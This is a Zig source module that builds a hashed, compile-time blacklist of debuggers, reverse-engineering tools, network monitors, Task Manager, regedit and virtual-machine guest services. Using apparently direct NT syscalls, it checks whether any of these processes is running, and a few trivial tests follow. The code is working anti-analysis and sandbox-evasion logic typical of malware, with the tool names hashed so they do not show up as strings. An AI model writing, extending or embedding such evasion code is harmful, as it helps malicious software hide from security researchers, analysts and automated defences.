const std = @import("std");
const types = @import("../types/types.zig");
const engine = @import("../syscalls/engine.zig");
const hash = @import("../types/hash.zig");
const config = @import("config");

const PROC_COUNT: usize = 35;

fn hashName(name: []const u8) u32 {
    var h: u32 = config.SEED;
    for (name) |c| {
        const lower = if (c >= 'A' and c <= 'Z') c + 32 else c;
        for (0..28) |_| {
            h = std.math.rotl(u32, h, 5);
            h = h ^ lower;
            h = h *% 0x1B873593 +% 0x85EBCA6B;
        }
    }
    return h;
}

const blacklist: [PROC_COUNT]u32 = blk: {
    @setEvalBranchQuota(100000);
    const names = [_][]const u8{
        "taskmgr.exe", "procexp.exe", "procexp64.exe", "procmon.exe",
        "procmon64.exe", "wireshark.exe", "dumpcap.exe", "fiddler.exe",
        "processhacker.exe", "processhacker64.exe", "x64dbg.exe", "x32dbg.exe",
        "x96dbg.exe", "ollydbg.exe", "ida.exe", "ida64.exe",
        "ghidra.exe", "windbg.exe", "dbgview.exe", "cheatengine.exe",
        "httppmon.exe", "tcpview.exe", "vmtoolsd.exe", "vboxservice.exe",
        "vboxtray.exe", "xenservice.exe", "pestudio.exe", "api_monitor.exe",
        "ksdumperclient.exe", "regedit.exe", "httpdebug.exe", "sysinternals.exe",
        "vmmap.exe", "rammap.exe", "tcpview64.exe",
    };
    var buf: [PROC_COUNT]u32 = undefined;
    for (names, 0..) |n, i| buf[i] = hashName(n);
    break :blk buf;
};

pub fn isSuspiciousProcessRunning() bool {
    var buf_base: ?types.PVOID = null;
    var size: types.SIZE_T = 256 * 1024;
    var ret_len: types.ULONG = 0;

    if (engine.NtAllocateVirtualMemory(
        @as(types.HANDLE, @ptrFromInt(~@as(usize, 0))),
        @as(*types.PVOID, @ptrCast(&buf_base)),
        0, &size,
        types.MEM_COMMIT | types.MEM_RESERVE,
        types.PAGE_READWRITE,
    ) < 0 or buf_base == null) return false;
    defer {
        var free_base: ?types.PVOID = buf_base;
        var free_size: types.SIZE_T = 0;
        _ = engine.NtFreeVirtualMemory(@as(types.HANDLE, @ptrFromInt(~@as(usize, 0))), @as(*types.PVOID, @ptrCast(&free_base)), &free_size, types.MEM_RELEASE);
    }

    if (engine.NtQuerySystemInformation(5, buf_base.?, @as(types.ULONG, @intCast(size)), &ret_len) < 0) return false;

    const bytes: [*]u8 = @ptrCast(@alignCast(buf_base.?));
    var offset: usize = 0;
    while (offset < ret_len) {
        const entry: *align(1) types.SYSTEM_PROCESS_INFORMATION = @ptrCast(bytes + offset);
        const name_len = entry.ImageName.Length / 2;
        if (name_len > 0 and name_len < 256) {
            const name_ptr: [*]u16 = @ptrCast(@alignCast(bytes + @intFromPtr(entry.ImageName.Buffer) - @intFromPtr(buf_base.?) + offset));
            var name_buf: [256]u8 = undefined;
            for (0..name_len) |i| name_buf[i] = @as(u8, @truncate(name_ptr[i]));
            const h = hashName(name_buf[0..name_len]);
            for (blacklist) |bh| {
                if (h == bh) return true;
            }
        }
        if (entry.NextEntryOffset == 0) break;
        offset += entry.NextEntryOffset;
    }
    return false;
}

test "hashName deterministic" {
    try std.testing.expectEqual(hashName("taskmgr.exe"), hashName("taskmgr.exe"));
}

test "hashName case insensitive" {
    try std.testing.expectEqual(hashName("taskmgr.exe"), hashName("TASKMGR.EXE"));
}

test "isSuspiciousProcessRunning no crash" {
    _ = isSuspiciousProcessRunning();
}
